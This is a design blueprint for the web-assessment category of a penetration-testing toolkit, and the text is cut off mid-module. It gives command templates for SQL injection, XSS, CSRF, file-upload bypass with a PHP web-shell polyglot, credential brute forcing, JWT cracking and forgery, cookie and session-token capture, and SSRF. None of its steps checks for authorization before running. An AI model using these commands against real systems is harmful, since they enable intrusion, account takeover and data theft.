# Web Assessment — Category Blueprint

**Category:** `WEB_ASSESSMENT` | **Slug:** `webapp` | **Tools Dir:** `~/jabber/jabber-tools/webapp/`
**Package:** `com.jabber.jabber.modules.webapp` | **Group:** Access & Penetration

---

## ToolManager: `webapp/ToolManager.java`

| ID | Binary | Source | Version Check | Install Method |
|----|--------|--------|---------------|----------------|
| `sqlmap` | `sqlmap` | pip/apt | `sqlmap --version` | `pip_install` |
| `nuclei` | `nuclei` | `projectdiscovery/nuclei` | `nuclei -version` | `github_release` |
| `ffuf` | `ffuf` | `ffuf/ffuf` | `ffuf -V` | `github_release` |
| `dalfox` | `dalfox` | `hahwul/dalfox` | `dalfox version` | `github_release` |
| `httpx` | `httpx` | `projectdiscovery/httpx` | `httpx -version` | `github_release` |
| `jwt_tool` | `jwt_tool` | pip | `jwt_tool --version` | `pip_install` |
| `graphqlmap` | `graphqlmap` | pip | `graphqlmap --help` | `pip_install` |
| `commix` | `commix` | pip | `commix --version` | `pip_install` |
| `wpscan` | `wpscan` | gem | `wpscan --version` | `pip_install` (gem) |
| `curl` | `curl` | apt/pkg | `curl --version` | `apt_install` |
| `dnsx` | `dnsx` | `projectdiscovery/dnsx` | `dnsx -version` | `github_release` |
| `subfinder` | `subfinder` | `projectdiscovery/subfinder` | `subfinder -version` | `github_release` |
| `dig` | `dig` | apt (dnsutils) | `dig -v` | `apt_install` |
| `whois` | `whois` | apt/pkg | `whois --version` | `apt_install` |

### Mandatory Sophisticated Target Intelligence Phase

As per Modules V5 standard, every `webapp` module MUST perform the **Sophisticated Discovery Suite** before scanning:
1. **Asset Mapping**: `subfinder -d <target> -silent` (Identify subdomains).
2. **DNS Classification**: `dnsx -d <target> -a -aaaa -cname -mx -ns -soa -txt -resp-only -silent` (Map all records).
3. **Infrastructure Fingerprinting**: `httpx -u <target> -title -server -td -silent` (Identify server identity).
4. **Ownership Analysis**: `whois <target>` (Extract Org/ASN/CIDR).
5. All results MUST be stored in `ReportGenerator` under `infrastructure_metadata`.

---

## Standardized Infrastructure
Every module in this category MUST implement the following self-contained architecture, located in its own dedicated package (e.g., `com.jabber.jabber.modules.<category>.<module_name>/`):

- **`[ModuleName]Module.java`**: The primary controller that defines the `@JABBERModule` metadata, declares the `ModuleInputField` schemas for each execution mode, and handles the orchestration between the UI and the execution engine.
- **`[ModuleName]Engine.java`**: The core execution orchestrator that implements the mandatory 8-step execution doctrine. It manages the high-level logic, tool sequencing, and results aggregation.
- **`ToolManager.java`**: Registry for the 5+ required tools. Handles tool status checks, versioning, and automatic dependency installation via OS-specific package managers (apt, pip, github_release).
- **`InputSanitizer.java`**: Mode-aware validation logic that ensures all inputs (IPs, domains, file paths) are sanitized and conform to security best practices before process execution.
- **`ProcessExecutor.java`**: A thread-safe, low-level process runner that manages `ProcessBuilder` lifecycles, real-time stdout/stderr streaming, and timeout enforcement.
- **`CommandRecord.java`**: A structured data container that captures full telemetry for every command executed (CLI strings, exit codes, durations, and output previews) for the final report.
- **`ReportGenerator.java`**: The findings aggregator that transforms raw tool output and `CommandRecord` data into high-fidelity, structured reports in JSON, Markdown, and HTML formats. It is strictly responsible for capturing, organizing, and physically saving all generated outputs (files, payloads, artifacts) into the reporting structure.

---

## Execution Doctrine (MANDATORY - SURGICAL)

Every module MUST implement the following 8-step execution loop in its `[ModuleName]Engine.java`:

1.  **Validate Mode**: Verify that the selected `ModuleMode` is supported and available.
2.  **Sanitize Schema**: Validate and sanitize all user-provided inputs against the mode-specific schema using `InputSanitizer`.
    - **Failure**: If mandatory input is missing, return `[Input required for execution]`.
3.  **Target Intelligence**: Perform mandatory infrastructure discovery (DNS resolution, WHOIS lookup, server fingerprinting via `dnsx`, `subfinder`, `httpx`).
4.  **Tool Readiness & Verification**: Resolve binary paths via `ToolManager` AND verify the specific tools explicitly selected by the user for this execution.
    - **Failure**: If `selectedTools` list is empty, return `[Must select a tool for execution]`.
5.  **Surgical Command Orchestration**: Build the exact command strings and arguments ONLY for the external tools that were explicitly selected by the user via the frontend toggles.
    - If a tool is not selected, it MUST NOT execute.
    - If one tool is selected, only its command logic runs.
    - If multiple tools are selected, only those tools' commands run sequentially.
6.  **Real-Time Streaming**: Execute selected tools sequentially via `ProcessExecutor` and stream live stdout/stderr logs to the `TaskContext` for UI visibility.
7.  **Findings Extraction**: Parse raw tool output using `ReportGenerator` to identify and extract high-fidelity security findings.
    - **Anti-Pollution**: Findings MUST be flat and professional. Remove CLI strings and durations from executive finding reports.
8.  **Full Telemetry**: Aggregate all telemetry data into the final `ModuleResult` for complete auditability.

---

### Output & Transparency

- **NO Phantom Findings**: If a tool returns no data or an error, no finding is generated. Every result must be verified by real data.
- **Full Traceability**: Every report must include the exact CLI commands executed to ensure transparency and reproducibility.
- **Multi-Format Delivery**: Findings are generated simultaneously in JSON (for automation), HTML (for presentation), and Markdown (for documentation).

---

## Artifact & Output Generation Standard (J. Standard)
Every module in this category MUST physically create and preserve the following outputs:
- **Location**: `reports/artifacts/`, `reports/payloads/`, `reports/outputs/`, or `reports/analysis/` within the module workspace.
- **Naming**: `[Mode]_[Timestamp]_[OriginalName].[Ext]`
- **Hashing**: Mandatory SHA256 hashing for all generated files.
- **Reporting**: All files must be linked and accessible via the final `ReportGenerator` output.

---

## Frontend Requirements

Every module in the **Web Assessment** category MUST implement the following UI components to ensure seamless interaction with the V5 architecture:

1. **Execution Mode Toggle**: Switch between web scanning depths (e.g., `SCAN` vs `FUZZ`).
2. **Dynamic Tool Selection Table**: Once an execution mode is selected, render a horizontal table listing all tools associated with that mode. The user must be able to toggle individual tools on/off to directly control execution behavior.
3. **Artifact Integration**: Direct links to the **Artifacts System (Category 21)** for viewing HTTP logs, extracted schemas (GraphQL), and captured session tokens.
4. **HTTP Response Viewer**: A side-by-side comparison tool for analyzing HTTP requests and responses (Request vs Response).
5. **Vulnerability Map**: Real-time visualization of the web application's attack surface and discovered injection points.

---

---

## Modules

### 1. SQL Injection Exploit
**ID:** `webapp-sqli` | **Risk:** CRITICAL | **File:** `SQLInjectionExploiterModule.java`
**Tools:** `sqlmap`, `nuclei`, `ffuf`, `httpx`, `commix`

#### Execution Modes:

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: High-fidelity SQL injection discovery across multiple attack surfaces.
    - **Input Schema**: `{ url: String }`
    - **Multi-Tool Command Logic**:
        1. `nuclei -u <url> -t sqli/ -json` (Template Validation)
        2. `sqlmap -u <url> --batch --crawl=2 --level 1 --risk 1` (Passive Scan)
        3. `ffuf -u <url>/FUZZ -w common_sqli_params.txt -mc 500` (Error Based Discovery)
        4. `httpx -u <url> -status-code -tech-detect -silent` (Tech Profile)
        5. `commix -u <url> --batch --crawl=1` (Command Injection Cross-Check)
    - **Execution Flow**: Template Validation -> Passive Scan -> Error Discovery -> Tech Profile -> Cross-Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_nuclei_sqli.json`: Nuclei SQLi template results.
        - `reports/artifacts/SCAN_[Timestamp]_sqlmap_passive.txt`: Passive sqlmap probe logs.
        - `reports/analysis/SCAN_[Timestamp]_webapp_tech.json`: Detailed technology stack fingerprint.

- **`MAPD`** (Short Name: `MAPD`)
    - **Purpose**: Exhaustive enumeration of database structure and environment.
    - **Input Schema**: `{ url: String, level: int, risk: int }`
    - **Multi-Tool Command Logic**:
        1. `sqlmap -u <url> --batch --level <level> --risk <risk> --banner --current-db --current-user` (Core Map)
        2. `nuclei -u <url> -t exposures/tokens/ -json` (Exfiltration Path Check)
        3. `ffuf -u <url>/FUZZ -w db_configs.txt -mc 200` (Config File Search)
        4. `httpx -u <url> -json -include-response-header` (Header Audit)
        5. `commix -u <url> --batch --os-cmd="id"` (System Privilege Test)
    - **Execution Flow**: Core Map -> Path Check -> Config Search -> Header Audit -> Privilege Test.
    - **Output Generation & Artifacts**:
        - `reports/outputs/MAP_[Timestamp]_sqlmap_dump.json`: Structured database schema and data dump.
        - `reports/artifacts/MAP_[Timestamp]_config_leak.txt`: Discovery log for sensitive configuration files.
        - `reports/analysis/MAP_[Timestamp]_security_headers.json`: Audit of HTTP security headers.

---

### 2. XSS Exploit
**ID:** `webapp-xss` | **Risk:** HIGH | **File:** `XSSExploitModule.java`
**Tools:** `dalfox`, `nuclei`, `ffuf`, `httpx`, `curl`

#### Execution Modes:

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Detect reflected, stored, and DOM-based XSS vulnerabilities.
    - **Input Schema**: `{ url: String }`
    - **Multi-Tool Command Logic**:
        1. `dalfox url <url> --json` (Dynamic XSS Probe)
        2. `nuclei -u <url> -t xss/ -json` (Template Verification)
        3. `ffuf -u <url>?FUZZ=1 -w params.txt -mc 200` (Parameter Discovery)
        4. `httpx -u <url> -status-code -tech-detect` (Asset Identity)
        5. `curl -v -k <url> -H "User-Agent: <script>alert(1)</script>"` (Header Injection Test)
    - **Execution Flow**: Dynamic Probe -> Template Verification -> Param Discovery -> Asset Identity -> Header Test.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_dalfox_xss.json`: Identified XSS injection points and payloads.
        - `reports/artifacts/SCAN_[Timestamp]_nuclei_xss.json`: Verified XSS findings from templates.
        - `reports/analysis/SCAN_[Timestamp]_parameter_map.json`: Map of discoverable and fuzzable parameters.

- **`FUZZ`** (Short Name: `FUZZ`)
    - **Purpose**: Exhaustive parameter fuzzing for XSS bypass and confirmation.
    - **Input Schema**: `{ url: String, wordlist: Path }`
    - **Multi-Tool Command Logic**:
        1. `ffuf -u <url>?FUZZ=<script>alert(1)</script> -w <wordlist> -mc 200 -of json` (Deep Fuzz)
        2. `dalfox url <url> --blind <blind_url>` (Blind XSS Attempt)
        3. `nuclei -u <url> -t protocols/http/ -json` (Protocol Audit)
        4. `httpx -u <url> -header-check` (Security Header Check)
        5. `curl -s <url> | grep -i "script"` (Manual Reflection Check)
    - **Execution Flow**: Deep Fuzz -> Blind Attempt -> Protocol Audit -> Header Check -> Reflection Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/FUZZ_[Timestamp]_ffuf_xss.json`: Deep fuzzing results for XSS filters.
        - `reports/artifacts/FUZZ_[Timestamp]_blind_xss_log.txt`: Log of blind XSS interactions and callbacks.
        - `reports/analysis/FUZZ_[Timestamp]_protocol_audit.json`: Combined protocol and header security audit.

---

### 3. CSRF Exploit
**ID:** `webapp-csrf` | **Risk:** MEDIUM | **File:** `CSRFExploitModule.java`
**Tools:** `nuclei`, `httpx`, `ffuf`, `curl`, `nmap`

#### Execution Modes:

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Identify endpoints vulnerable to Cross-Site Request Forgery.
    - **Input Schema**: `{ url: String }`
    - **Multi-Tool Command Logic**:
        1. `nuclei -u <url> -t csrf/ -json` (Core CSRF Scan)
        2. `httpx -u <url> -status-code -tech-detect` (Asset Profiling)
        3. `ffuf -u <url>/FUZZ -w sensitive_actions.txt -mc 200` (Action Discovery)
        4. `curl -I <url>` (Cookie Flag Audit)
        5. `nmap -p 80,443 --script http-csrf <url>` (Nmap Verification)
    - **Execution Flow**: CSRF Scan -> Profiling -> Action Discovery -> Cookie Audit -> Nmap Verify.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_nuclei_csrf.json`: Detected CSRF vulnerabilities and endpoints.
        - `reports/artifacts/SCAN_[Timestamp]_nmap_csrf.xml`: Nmap technical verification results.
        - `reports/analysis/SCAN_[Timestamp]_action_map.json`: Map of sensitive actions identified for CSRF.

- **`TEST`** (Short Name: `TEST`)
    - **Purpose**: Validate CSRF protection mechanisms and bypasses.
    - **Input Schema**: `{ url: String, method: String, data: String }`
    - **Multi-Tool Command Logic**:
        1. `curl -X <method> -H "Origin: evil.com" -d "<data>" <url>` (Origin Bypass Test)
        2. `curl -X <method> -H "Referer: http://google.com" -d "<data>" <url>` (Referer Bypass Test)
        3. `ffuf -u <url> -H "X-CSRF-Token: FUZZ" -w tokens.txt -X <method>` (Token Replay Test)
        4. `httpx -u <url> -header-check` (SOP Audit)
        5. `nuclei -u <url> -t misconfiguration/cors -json` (CORS/CSRF Interdependency)
    - **Execution Flow**: Origin Bypass -> Referer Bypass -> Token Replay -> SOP Audit -> CORS Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/TEST_[Timestamp]_csrf_bypass.json`: Results of various CSRF protection bypass attempts.
        - `reports/artifacts/TEST_[Timestamp]_origin_referer_probe.txt`: Technical log of origin/referer manipulation.
        - `reports/analysis/TEST_[Timestamp]_sop_cors_audit.json`: Audit of Same-Origin Policy and CORS context.

---

### 4. File Upload Exploit
**ID:** `webapp-fileupload` | **Risk:** CRITICAL | **File:** `FileUploadExploitModule.java`
**Tools:** `nuclei`, `ffuf`, `httpx`, `curl`, `exiftool`

#### Execution Modes:

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Discover and audit file upload endpoints for security flaws.
    - **Input Schema**: `{ url: String }`
    - **Multi-Tool Command Logic**:
        1. `nuclei -u <url> -t file-upload/ -json` (Template Upload Scan)
        2. `ffuf -u <url>/FUZZ -w upload_paths.txt -mc 200` (Endpoint Discovery)
        3. `httpx -u <url> -status-code -tech-detect` (Web Framework Check)
        4. `curl -v <url>` (Form Action Audit)
        5. `exiftool -all= image.jpg` (Metadata Sanitization Check)
    - **Execution Flow**: Template Scan -> Endpoint Discovery -> Framework Check -> Form Audit -> Metadata Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_nuclei_upload.json`: Identified file upload vulnerabilities.
        - `reports/artifacts/SCAN_[Timestamp]_endpoint_discovery.txt`: Log of discovered file upload paths.
        - `reports/analysis/SCAN_[Timestamp]_framework_audit.json`: Fingerprint of the web framework's upload handler.

- **`BYPS`** (Short Name: `BYPS`)
    - **Purpose**: Test for extension, MIME-type, and content-based upload bypasses.
    - **Input Schema**: `{ url: String, endpoint: String }`
    - **Multi-Tool Command Logic**:
        1. `ffuf -u <url>/<endpoint> -X POST -F "file=@shell.FUZZ" -w extensions.txt` (Extension Bypass)
        2. `curl -X POST -F "file=@shell.php;type=image/jpeg" <url>/<endpoint>` (MIME Bypass)
        3. `exiftool -Comment="<?php system(\$_GET['cmd']); ?>" image.jpg` (Polyglot Creation)
        4. `httpx -u <url>/uploads/shell.php -status-code` (Access Verification)
        5. `nuclei -u <url> -t exploits/fileupload-rce.yaml` (RCE Confirmation)
    - **Execution Flow**: Extension Bypass -> MIME Bypass -> Polyglot Creation -> Access Verify -> RCE Confirm.
    - **Output Generation & Artifacts**:
        - `reports/payloads/BYPASS_[Timestamp]_polyglot_shell.php.jpg`: Weaponized polyglot image payload.
        - `reports/outputs/BYPASS_[Timestamp]_extension_mime_results.json`: Detailed report on bypass effectiveness.
        - `reports/artifacts/BYPASS_[Timestamp]_rce_confirmation.txt`: Technical confirmation of RCE via uploaded file.

---

### 5. Auth Bypass
**ID:** `webapp-authbypass` | **Risk:** HIGH | **File:** `AuthenticationBypassModule.java`
**Tools:** `nuclei`, `ffuf`, `hydra`, `httpx`, `curl`

#### Execution Modes:

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Identify authentication bypass and session management flaws.
    - **Input Schema**: `{ url: String }`
    - **Multi-Tool Command Logic**:
        1. `nuclei -u <url> -t default-logins/,misconfiguration/ -json` (Core Bypass Scan)
        2. `ffuf -u <url>/FUZZ -w login_pages.txt -mc 200,401` (Endpoint Discovery)
        3. `httpx -u <url> -status-code -tech-detect` (Web Server Audit)
        4. `curl -I <url>/admin` (Unauthorized Access Probe)
        5. `hydra -C default_creds.txt <url> http-get /login` (Quick Credential Check)
    - **Execution Flow**: Core Bypass -> Endpoint Discovery -> Server Audit -> Access Probe -> Credential Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_nuclei_auth.json`: Detected authentication and session flaws.
        - `reports/artifacts/SCAN_[Timestamp]_unauth_probe.txt`: Results of unauthorized access attempts to protected areas.
        - `reports/analysis/SCAN_[Timestamp]_login_endpoint.json`: Fingerprint of identified login mechanisms.

- **`BRTE`** (Short Name: `BRTE`)
    - **Purpose**: High-speed credential brute forcing and account takeover audit.
    - **Input Schema**: `{ url: String, user: String, wordlist: Path }`
    - **Multi-Tool Command Logic**:
        1. `hydra -l <user> -P <wordlist> <url> http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"` (Core Brute)
        2. `ffuf -u <url>/login -X POST -d "user=<user>&pass=FUZZ" -w <wordlist> -mr "success"` (Confirmation Brute)
        3. `nuclei -u <url> -t takeovers/ -json` (Post-Auth Takeover Check)
        4. `httpx -u <url> -follow-redirects` (Success Path Audit)
        5. `curl -v -c cookies.txt -d "user=<user>&pass=..." <url>/login` (Session Token Capture)
    - **Execution Flow**: Core Brute -> Confirmation Brute -> Takeover Check -> Path Audit -> Token Capture.
    - **Output Generation & Artifacts**:
        - `reports/outputs/BRUTE_[Timestamp]_hydra_results.json`: Successful credentials identified via brute force.
        - `reports/artifacts/BRUTE_[Timestamp]_session_tokens.txt`: Captured session tokens from successful logins.
        - `reports/analysis/BRUTE_[Timestamp]_login_path.json`: Technical audit of the login flow and redirects.

---

### 6. API Exploit
**ID:** `webapp-api` | **Risk:** HIGH | **File:** `APIExploitModule.java`
**Tools:** `nuclei`, `ffuf`, `httpx`, `curl`, `jwt_tool`

#### Execution Modes:

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Comprehensive security audit of REST/SOAP/Microservice APIs.
    - **Input Schema**: `{ url: String }`
    - **Multi-Tool Command Logic**:
        1. `nuclei -u <url> -t api/ -json` (Core API Scan)
        2. `httpx -u <url> -path /swagger.json,/v1/api-docs -status-code` (Doc Discovery)
        3. `ffuf -u <url>/FUZZ -w api_endpoints.txt -mc 200,401,403` (Shadow API Discovery)
        4. `curl -X OPTIONS <url> -v` (Method Audit)
        5. `jwt_tool -t <token> -I` (Token Header Profile)
    - **Execution Flow**: Core API Scan -> Doc Discovery -> Shadow Discovery -> Method Audit -> Token Profile.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_nuclei_api.json`: Security findings for REST/SOAP endpoints.
        - `reports/artifacts/SCAN_[Timestamp]_api_docs.json`: Extracted API documentation (Swagger/Docs).
        - `reports/analysis/SCAN_[Timestamp]_api_shadow_map.json`: Map of hidden and undocumented API endpoints.

- **`FUZZ`** (Short Name: `FUZZ`)
    - **Purpose**: Deep parameter fuzzing and logic flaw discovery in API endpoints.
    - **Input Schema**: `{ url: String, wordlist: Path }`
    - **Multi-Tool Command Logic**:
        1. `ffuf -u <url>/FUZZ -w <wordlist> -mc 200,201,401 -of json` (Endpoint Fuzz)
        2. `nuclei -u <url> -t protocols/http/ -json` (Injection Probe)
        3. `httpx -u <url> -status-code -content-length` (Response Profile)
        4. `curl -X POST <url> -d '{"FUZZ": "test"}' -w <wordlist>` (JSON Param Fuzz)
        5. `jwt_tool -t <token> -X <method> -k <key>` (Token Tamper Test)
    - **Execution Flow**: Endpoint Fuzz -> Injection Probe -> Response Profile -> JSON Fuzz -> Token Tamper.
    - **Output Generation & Artifacts**:
        - `reports/outputs/FUZZ_[Timestamp]_api_logic_flaws.json`: Identified logic flaws and parameter injections.
        - `reports/artifacts/FUZZ_[Timestamp]_jwt_tamper_log.txt`: Log of JWT token manipulation and response.
        - `reports/analysis/FUZZ_[Timestamp]_api_response_profile.json`: Statistical profile of API responses for anomaly detection.

---

### 7. GraphQL Introspect
**ID:** `webapp-graphql` | **Risk:** MEDIUM | **File:** `GraphQLIntrospectModule.java`
**Tools:** `graphqlmap`, `nuclei`, `curl`, `httpx`, `ffuf`

#### Execution Modes:

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Detect GraphQL introspection and common injection vectors.
    - **Input Schema**: `{ url: String }`
    - **Multi-Tool Command Logic**:
        1. `nuclei -u <url> -t graphql/ -json` (Core GraphQL Scan)
        2. `httpx -u <url> -path /graphql,/graphiql -status-code` (Endpoint Audit)
        3. `curl -X POST <url> -d '{"query": "{__schema{types{name}}}"}'` (Manual Introspection)
        4. `ffuf -u <url> -X POST -d '{"query": "FUZZ"}' -w graphql_queries.txt` (Query Fuzz)
        5. `graphqlmap -u <url> --introspect` (Schema Mapping)
    - **Execution Flow**: Core Scan -> Endpoint Audit -> Manual Introspection -> Query Fuzz -> Schema Mapping.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_nuclei_graphql.json`: Detected GraphQL security misconfigurations.
        - `reports/artifacts/SCAN_[Timestamp]_introspection_raw.json`: Raw results of GraphQL introspection queries.
        - `reports/analysis/SCAN_[Timestamp]_graphql_endpoint.json`: Technical identification of GraphQL service.

- **`DUMP`** (Short Name: `DUMP`)
    - **Purpose**: Exhaustive extraction of GraphQL schemas, types, and queries.
    - **Input Schema**: `{ url: String }`
    - **Multi-Tool Command Logic**:
        1. `graphqlmap -u <url> --dump` (Full Schema Dump)
        2. `nuclei -u <url> -t exposures/tokens/` (Token Leakage Check)
        3. `httpx -u <url> -json -include-response-header` (Server Identity)
        4. `ffuf -u <url> -X POST -d '{"query": "mutation { FUZZ }"}' -w mutations.txt` (Mutation Fuzz)
        5. `curl -v <url>` (Verbosity Audit)
    - **Execution Flow**: Schema Dump -> Token Leakage -> Server Identity -> Mutation Fuzz -> Verbosity.
    - **Output Generation & Artifacts**:
        - `reports/outputs/DUMP_[Timestamp]_graphql_schema.graphql`: Complete extracted GraphQL schema and types.
        - `reports/artifacts/DUMP_[Timestamp]_mutation_fuzz.json`: Results of mutation fuzzing and unauthorized actions.
        - `reports/analysis/DUMP_[Timestamp]_token_leakage.json`: Sensitive data identified in GraphQL responses.

---

### 8. Cookie Stealer
**ID:** `webapp-cookie` | **Risk:** LOW | **File:** `CookieStealerModule.java`
**Tools:** `httpx`, `curl`, `nuclei`, `dalfox`, `ffuf`

#### Execution Modes:

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Audit session cookie security flags and transmission security.
    - **Input Schema**: `{ url: String }`
    - **Multi-Tool Command Logic**:
        1. `httpx -u <url> -json -include-response-header` (Core Header Audit)
        2. `curl -I <url> -v` (Manual Header Probe)
        3. `nuclei -u <url> -t misconfiguration/cookie-security.yaml` (Template Audit)
        4. `dalfox url <url> --cookie-scan` (Session-specific XSS Probe)
        5. `ffuf -u <url> -H "Cookie: FUZZ" -w common_cookies.txt` (Session Fixation Test)
    - **Execution Flow**: Header Audit -> Header Probe -> Template Audit -> XSS Probe -> Fixation Test.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_cookie_security.json`: Detailed audit of session cookie flags (HttpOnly, Secure, SameSite).
        - `reports/artifacts/SCAN_[Timestamp]_fixation_test.txt`: Log of session fixation vulnerability probes.
        - `reports/analysis/SCAN_[Timestamp]_cookie_inventory.json`: Inventory of all identified cookies and their purposes.

- **`ANLZ`** (Short Name: `ANLZ`)
    - **Purpose**: Deep statistical and cryptographic analysis of session identifiers.
    - **Input Schema**: `{ url: String }`
    - **Multi-Tool Command Logic**:
        1. `curl -v <url> 2>&1 | grep "Set-Cookie" > cookies.log` (Cookie Capture)
        2. `httpx -u <url> -follow-redirects -json` (Flow Analysis)
        3. `nuclei -u <url> -t protocols/http/ -json` (Protocol Security)
        4. `ffuf -u <url> -H "Cookie: session=FUZZ" -w <wordlist>` (Entropy Test)
        5. `dalfox url <url> --custom-cookie "test=1"` (Cookie Reflection Test)
    - **Execution Flow**: Capture -> Flow Analysis -> Protocol Security -> Entropy Test -> Reflection Test.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/ANALYZ_[Timestamp]_cookie_entropy.txt`: Statistical analysis of cookie randomness/entropy.
        - `reports/outputs/ANALYZ_[Timestamp]_flow_analysis.json`: Map of cookie state changes through the application flow.
        - `reports/analysis/ANALYZ_[Timestamp]_cookie_reflection.json`: Verification of cookie values reflecting in the DOM.

---

### 9. CORS Misconfig
**ID:** `webapp-cors` | **Risk:** LOW | **File:** `CorsMisconfigModule.java`
**Tools:** `nuclei`, `curl`, `httpx`, `ffuf`, `nmap`

#### Execution Modes:

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Detect CORS misconfigurations and cross-origin security flaws.
    - **Input Schema**: `{ url: String }`
    - **Multi-Tool Command Logic**:
        1. `nuclei -u <url> -t misconfiguration/cors -json` (Core CORS Scan)
        2. `httpx -u <url> -json -include-response-header` (Header Audit)
        3. `curl -v -H "Origin: https://evil.com" <url>` (Manual Origin Probe)
        4. `ffuf -u <url> -H "Origin: FUZZ" -w cors_origins.txt -mc 200` (Origin Fuzz)
        5. `nmap -p 80,443 --script http-cors <url>` (Nmap Verification)
    - **Execution Flow**: Core Scan -> Header Audit -> Manual Probe -> Origin Fuzz -> Nmap Verify.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_nuclei_cors.json`: Detected CORS misconfigurations and flaws.
        - `reports/artifacts/SCAN_[Timestamp]_origin_fuzz.txt`: Detailed log of origin fuzzing results.
        - `reports/analysis/SCAN_[Timestamp]_cors_policy.json`: Mapped CORS policy and allowed origins.

- **`TEST`** (Short Name: `TEST`)
    - **Purpose**: Validate CORS policy bypasses and data exfiltration potential.
    - **Input Schema**: `{ url: String, origin: String }`
    - **Multi-Tool Command Logic**:
        1. `curl -v -H "Origin: <origin>" <url>` (Targeted Origin Test)
        2. `curl -v -H "Origin: <origin>" -H "Access-Control-Request-Method: POST" -X OPTIONS <url>` (Preflight Test)
        3. `httpx -u <url> -header-check` (SOP Verification)
        4. `ffuf -u <url> -H "Origin: <origin>.evil.com" -mc 200` (Subdomain Bypass Test)
        5. `nuclei -u <url> -t misconfiguration/cors-exfil.yaml` (Exfiltration Test)
    - **Execution Flow**: Targeted Test -> Preflight Test -> SOP Verify -> Subdomain Bypass -> Exfiltration Test.
    - **Output Generation & Artifacts**:
        - `reports/outputs/TEST_[Timestamp]_cors_exfil.json`: Results of data exfiltration attempts via CORS.
        - `reports/artifacts/TEST_[Timestamp]_preflight_results.txt`: Technical analysis of OPTIONS preflight responses.
        - `reports/analysis/TEST_[Timestamp]_bypass_verification.json`: Report on subdomain and origin bypass success.

---

### 10. JWT Decrypter
**ID:** `webapp-jwt` | **Risk:** MEDIUM | **File:** `JWTDecrypterModule.java`
**Tools:** `jwt_tool`, `nuclei`, `httpx`, `curl`, `python3`

#### Execution Modes:

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Identify JWT implementation flaws and weak signing algorithms.
    - **Input Schema**: `{ token: String }`
    - **Multi-Tool Command Logic**:
        1. `jwt_tool <token> -T -S hs256 -p ""` (None Algorithm Probe)
        2. `nuclei -u <url> -t tokens/jwt-detect.yaml -json` (Template Detection)
        3. `httpx -u <url> -header-check` (Transmission Security)
        4. `curl -v -H "Authorization: Bearer <token>" <url>` (Header Audit)
        5. `python3 jwt_analyzer.py <token>` (Statistical Analysis)
    - **Execution Flow**: None Probe -> Template Detect -> Transmission Security -> Header Audit -> Statistical Analysis.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_jwt_audit.json`: Detailed audit of JWT algorithms and signing.
        - `reports/artifacts/SCAN_[Timestamp]_none_algo_test.txt`: Verification of the "none" algorithm bypass.
        - `reports/analysis/SCAN_[Timestamp]_jwt_profile.json`: Cryptographic profile of the identified JWT tokens.

- **`CRCK`** (Short Name: `CRCK`)
    - **Purpose**: High-speed brute forcing and secret discovery for JWT tokens.
    - **Input Schema**: `{ token: String, wordlist: Path }`
    - **Multi-Tool Command Logic**:
        1. `jwt_tool <token> -C -d <wordlist>` (Core Brute)
        2. `nuclei -u <url> -t exposures/tokens/jwt-secrets.yaml` (Secret Leakage Check)
        3. `httpx -u <url> -path /.env,/.git -silent` (Config Leakage Audit)
        4. `curl -X POST <url> -d "token=<token>"` (Token Validation Probe)
        5. `python3 jwt_forge.py <token> -k <secret>` (Forgery Verification)
    - **Execution Flow**: Core Brute -> Secret Leakage -> Config Audit -> Validation Probe -> Forgery Verification.
    - **Output Generation & Artifacts**:
        - `reports/outputs/CRACK_[Timestamp]_jwt_secret.txt`: Identified JWT signing secret or key.
        - `reports/artifacts/CRACK_[Timestamp]_forged_token.txt`: Successfully forged JWT token for access.
        - `reports/analysis/CRACK_[Timestamp]_leakage_audit.json`: Discovery of JWT secrets in environment or files.

---

### 11. SSRF Mapper
**ID:** `webapp-ssrf` | **Risk:** HIGH | **File:** `SSRFMapperModule.java`
**Tools:** `nuclei`, `ffuf`, `httpx`, `curl`, `commix`

#### Execution Modes:

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Detect SSRF vulnerabilities across multiple input vectors.
    - **Input Schema**: `{ url: String }`
    - **Multi-Tool Command Logic**:
        1. `nuclei -u <url> -t ssrf/ -json` (Core SSRF Scan)
        2. `ffuf -u <url>/FUZZ -w ssrf_params.txt -mc 500` (Parameter Discovery)
        3. `httpx -u <url> -status-code -tech-detect` (Asset Profile)
        4. `curl -v -I "https://<url>?url=http://127.0.0.1"` (Manual Loopback Probe)
        5. `commix -u <url> --batch --crawl=1` (Cross-Vuln Check)
    - **Execution Flow**: Core Scan -> Param Discovery -> Asset Profile -> Loopback Probe -> Cross-Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_nuclei_ssrf.json`: Detected SSRF vulnerabilities and vectors.
        - `reports/artifacts/SCAN_[Timestamp]_loopback_probe.txt`: Results of internal/loopback connectivity tests.
        - `reports/analysis/SCAN_[Timestamp]_param_discovery.json`: Map of identified parameters susceptible to SSRF.

- **`MAPD`** (Short Name: `MAPD`)
    - **Purpose**: Use SSRF to map and audit internal infrastructure.
    - **Input Schema**: `{ url: String, internal_cidr: String }`
